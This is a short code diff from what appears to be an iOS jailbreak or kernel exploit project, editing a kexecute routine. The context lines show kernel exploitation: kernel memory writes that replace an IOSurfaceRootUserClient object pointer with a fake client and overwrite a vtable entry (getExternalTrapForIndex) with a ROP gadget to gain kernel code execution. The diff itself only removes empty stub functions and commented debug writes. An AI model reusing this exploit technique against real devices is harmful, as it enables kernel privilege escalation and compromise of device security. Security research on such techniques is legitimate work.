@@ -27,12 +27,6 @@ mach_port_t prepare_user_client(void) {
 
 static mach_port_t user_client;
 
-void init_kexecute(void) {
-}
-
-void term_kexecute(void) {
-}
-
 uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
     if (!user_client) {
         user_client = prepare_user_client();
@@ -77,13 +71,11 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
         wk64(fake_client, fake_vtable);
         
         wk64(fake_vtable + 8 * 0xB7, find_add_x0_x0_0x40_ret());
-        // wk64(fake_vtable + 8 * 0xB7, 0xffffffffdeadbeef);
         
         NSLog(@"Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
     }
     
     wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, fake_client);
-    // wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, 0xffffffffdeadbeef);
     
     wk64(fake_client + 0x50, 0);
     
